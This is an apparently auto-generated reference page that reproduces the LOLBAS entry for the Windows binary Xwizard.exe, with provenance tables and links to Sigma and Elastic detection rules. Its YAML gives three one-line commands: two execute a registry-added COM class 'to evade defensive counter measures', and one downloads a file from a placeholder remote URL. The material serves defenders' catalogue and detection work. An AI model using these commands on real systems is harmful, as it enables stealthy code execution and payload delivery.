---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Xwizard.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `xwizard.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Xwizard.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Xwizard.exe](../../tools/windows/xwizard.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | xwizard.exe |
| name | Xwizard.exe |
| type | tool |
| source | lolbas |
| url | http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@Hexacorn'
  Person: Adam
- Handle: '@NickTyrer'
  Person: Nick Tyrer
- Handle: '@harr0ey'
  Person: harr0ey
- Handle: '@notwhickey'
  Person: Wade Hickey
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
  Description: Xwizard.exe running a custom class that has been added to the registry.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: COM
  Usecase: Run a com object created in registry to evade defensive counter measures
- Category: Execute
  Command: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
  Description: Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error
    message in later Windows 10 builds.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: COM
  Usecase: Run a com object created in registry to evade defensive counter measures
- Category: Download
  Command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
  Description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from Internet
Created: 2018-05-25
Description: Execute custom class that has been added to the registry or download a file with Xwizard.exe
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_class_exec_xwizard.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dll_sideload_xwizard.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/execution_com_object_xwizard.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
Full_Path:
- Path: C:\Windows\System32\xwizard.exe
- Path: C:\Windows\SysWOW64\xwizard.exe
Name: Xwizard.exe
Resources:
- Link: http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
- Link: https://www.youtube.com/watch?v=LwDHX7DVHWU
- Link: https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5
- Link: https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/
- Link: https://twitter.com/notwhickey/status/1306023056847110144
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Xwizard.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/execution_com_object_xwizard.toml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_class_exec_xwizard.yml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dll_sideload_xwizard.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_class_exec_xwizard.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dll_sideload_xwizard.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/execution_com_object_xwizard.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
```
